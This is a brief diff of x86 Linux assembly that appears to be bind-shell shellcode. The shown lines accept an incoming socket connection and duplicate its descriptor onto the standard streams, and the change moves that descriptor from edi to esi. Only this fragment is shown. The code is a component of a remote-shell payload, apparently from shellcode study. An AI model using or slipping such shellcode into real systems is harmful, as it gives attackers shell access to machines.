@@ -48,9 +48,9 @@ mov ax, 0x16c ;accept system call number
 mov ebx, edi ;sockfd
 xor ecx, ecx ;NULL
 xor edx, edx ;NULL
+xor esi, esi
 int 0x80 ;Go for it
-xor edi, edi
-mov edi, eax
+mov esi, eax
 
 ;for (int i = 0; i < 3; i++)
 ;{
@@ -60,7 +60,7 @@ mov cl, 3
 dup:
     xor eax, eax
     mov al, 0x3f ;dup system call number 
-    mov ebx, edi ;mov the fd variable in ebx
+    mov ebx, esi ;mov the fd variable in ebx
     dec cl ;dec to cl 1
     int 0x80 ;Go for it
     inc cl ;inc to cl 1
